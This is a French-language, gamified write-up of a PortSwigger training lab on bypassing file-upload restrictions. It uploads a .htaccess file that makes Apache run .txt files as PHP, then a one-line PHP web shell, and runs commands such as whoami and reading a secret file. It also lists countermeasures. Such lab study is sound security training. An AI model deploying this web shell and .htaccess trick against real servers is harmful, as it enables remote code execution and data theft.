🧨 Mission 4.6 – Web Shell via .htaccess Drop
🎯 Objectif de la mission
Contourner une protection serveur empêchant l’exécution de fichiers PHP en uploadant :

Un fichier web shell avec une extension inoffensive (.txt)

Un fichier .htaccess configurant Apache pour interpréter ces fichiers comme du PHP

🧠 Compétences développées
🔸1. Compréhension du fonctionnement de .htaccess
Petit fichier de configuration local pour le serveur Apache

Permet de surcharger les règles globales (ex. : extensions, répertoires)

Clé pour forcer des comportements interdits

🔸2. Manipulation manuelle d’un upload via Burp Suite
Modification du champ filename=".htaccess"

Insertion directe du payload dans la requête multipart/form-data

Adaptation des en-têtes MIME pour masquer le vrai contenu

🔸3. Contournement par double attaque
Bypass d’analyse d’extension (.txt accepté)

Contournement via changement du type MIME Apache

🔸4. Exécution de commandes système (RCE)
Utilisation de ?cmd=whoami pour tester l’exécution

Extraction du contenu d’un fichier (cat /home/carlos/secret)

🔍 Payloads utilisés
📂 .htaccess (modifie le comportement du dossier)
bash
Copier
Modifier
AddType application/x-httpd-php .txt
📄 shell.txt (fichier interprété comme du PHP)
php
Copier
Modifier
<?php echo "TXT Shell OK"; system($_GET['cmd']); ?>
✅ Résultat
Étape	Statut
Fichier .htaccess uploadé	✅
Web shell .txt accepté	✅
Interprétation PHP confirmée (?cmd=whoami)	✅
Récupération du secret (cat /home/carlos/secret)	✅
Lab officiellement validé sur PortSwigger	🟢 YES!

🔐 Risque de sécurité
Élément	Détail
🚨 Gravité	Élevée : accès distant au serveur
🌐 Réaliste	Oui, dans des apps custom ou mal sécurisées
🛡️ Contre-mesures	Bloquer .htaccess, désactiver AddType, valider contenu + extension + MIME

🏅 Badge débloqué
🧾🔥 Rewrite Wizard
“Tu as redéfini les règles du jeu pour obtenir ce que le serveur ne voulait pas t’offrir.”

🎯 Bravo ! Tu veux enchaîner avec la Mission 4.7 : contournement via Content-Type/MIME spoofing ?